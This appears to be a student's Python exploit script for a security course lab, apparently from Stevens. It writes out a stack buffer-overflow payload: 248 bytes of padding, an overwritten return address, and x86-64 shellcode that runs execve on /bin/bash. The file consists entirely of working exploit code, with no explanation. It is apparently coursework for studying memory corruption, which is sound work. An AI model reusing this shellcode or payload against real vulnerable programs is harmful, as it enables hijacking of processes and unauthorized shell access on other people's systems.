# malicious_input-5_3.py
# I pledge my honor that I have abided by the Stevens Honor System.
# Justin Ho

import sys

sc = b"\x48\x31\xc0\x04\x3b\x48\x31\xf6\x48\x31\xd2\x48\x31\xff\x48\x8d\x3d\x21\x44\x44\x44\x48\x81\xef\x02\x44\x44\x44\x4d\x31\xc0\x49\x83\xc0\x08\x4a\x89\x74\x07\x01\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x0f\x05\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"

sc_addr = b"\x60\xc1\xff\xff\xff\x7f\x00\x00"

exploit = 248 * b'A' + sc_addr
exploit += sc

sys.stdout.write(exploit)
